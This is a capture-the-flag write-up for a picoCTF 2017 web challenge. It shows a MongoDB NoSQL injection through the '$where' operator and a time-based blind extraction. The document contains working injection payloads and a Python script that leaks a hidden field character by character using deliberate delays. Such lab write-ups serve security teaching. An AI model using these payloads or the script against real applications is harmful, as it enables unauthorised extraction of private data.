## A Kaley Ceilidh - 175

### Description

Everyone loves Scottish food [citation needed], but do you ever wish there were more hipster-y options? Well look no further than a [Kaley Ceilidh](http://shell2017.picoctf.com:8080/).

### Hint

  - There's not a whole lot you can do on this application. If your normal attacks aren't working, perhaps you need to think bigger. Humongous, in fact.
  - The server probably won't show you anything that contains a "flag" property.

### Write up

The hint says 'Humongous', which implies that the server uses MongoDB.

When I use normal search 'aaaa' in the site, the query is passed in json format.

    {"tags": "aaaa"}

Also when I use advanced search Name: 'aaaa', Price: 'bbbb', Tag: 'cccc'.   

    {"name": "aaaa", "tags": "cccc", "cost": "$bbbb"}

As I corrupt json format like below, it outputs error.

    {"asdf", }

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error</title>
    </head>
    <body>
        <pre>SyntaxError: Unexpected token } in JSON at position 9
            <br> &nbsp; &nbsp;at Object.parse (native)
            <br> &nbsp; &nbsp;at parse (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/body-parser/lib/types/json.js:88:17)
            <br> &nbsp; &nbsp;at /problems/fb57a362b19de0f734e21132a9b7e552/node_modules/body-parser/lib/read.js:116:18
            <br> &nbsp; &nbsp;at invokeCallback (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/raw-body/index.js:262:16)
            <br> &nbsp; &nbsp;at done (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/raw-body/index.js:251:7)
            <br> &nbsp; &nbsp;at IncomingMessage.onEnd (/problems/fb57a362b19de0f734e21132a9b7e552/node_modules/raw-body/index.js:307:7)
            <br> &nbsp; &nbsp;at emitNone (events.js:86:13)
            <br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:185:7)
            <br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:974:12)
            <br> &nbsp; &nbsp;at _combinedTickCallback (internal/process/next_tick.js:80:11)
            <br> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:104:9)
        </pre>
    </body>
</html>
```

Or if I send correct query, it outputs json response.

    {"name": "Kale Haggis"}

```
{
    "data": [
        {
            "name": "Kale Haggis",
            "description": "All the things you hate about haggis, without any of its almost-redeeming qualities!",
            "cost": "$13.37",
            "tags": [
                "kale",
                "haggis",
                "gross",
                "food",
                "green",
                "expensive"
            ]
        }
    ],
    "time": 1
}
```

Okay... So the server side script might be like this.

    db.blahblah.find(JSON_DATA_WE_SEND);

As I searched google, there is a `$where` operator that allows us to execute javascript code in mongoDB query. (https://zanon.io/posts/nosql-injection-in-mongodb)

    {"$where": "return true"}


```
{
    "data": [
        {
            "name": "Kale Haggis",
            "description": "All the things you hate about haggis, without any of its almost-redeeming qualities!",
            "cost": "$13.37",
            "tags": [
                "kale",
                "haggis",
                "gross",
                "food",
                "green",
                "expensive"
            ]
        },
        {
            "name": "Quinoa Porridge",
            "description": "Imagine eating slimy oatmeal that was bitter no matter how much sugar you put in. That's about what it's like.",
            "cost": "$3.14",
            "tags": [
                "quinoa",
                "porridge",
                "slimy",
                "oatmeal",
                "food",
                "bitter"
            ]
        },
        ...
```

Oh, it works!

But as hint says, the server does not return things that has flag property, which means we cannot directly see the flag.

So it's a blind injection problem, and since we cannot make difference responses, time-based injection can be a solution.

```
{
  "$where":
  "
    if(this.tags.indexOf('flag') != -1)
    {
      var d = new Date().getTime();
      while(new Date().getTime() < d + 2000){;}
    };
    return false;
  "
}
// newline is just for readability.
```

If there is a thing that contains `flag` tag, the code will sleep for 2 seconds.

And it works, okay... let's write a script.

```python
import requests
import time

url = 'http://shell2017.picoctf.com:8080/search'

# alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+'
alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+_%{} '
num = '1234567890'
flag = ''
for idx in range(0, 31):
    for al in alnum:
        payload = {
            '$where': "if(this.tags.indexOf('flag') != -1 && this.flag[%d]=='%s'){ var d = new Date().getTime(); while(new Date().getTime() < d + 2000){;}}; return false;" % (idx, al),
            # '$where': "if(this.tags.indexOf('flag') != -1 && this.flag && this.flag.length=='%d'){ var d = new Date().getTime(); while(new Date().getTime() < d + 2000){;}}; return false;" % al,
        }

        s = time.time()
        response = requests.post(url=url, json=payload)
        e = time.time()

        r = response.text
        # print(r)
        if e-s > 2:
            print(idx, al)
            flag += al
            break

print(flag)
```

    name : "Organic Flag"
    description : "Submit me for points"
    tag : "flag1"
    flag : "flag{I_only_eat_0rg4n1c_flages}"

> flag{I_only_eat_0rg4n1c_flages}
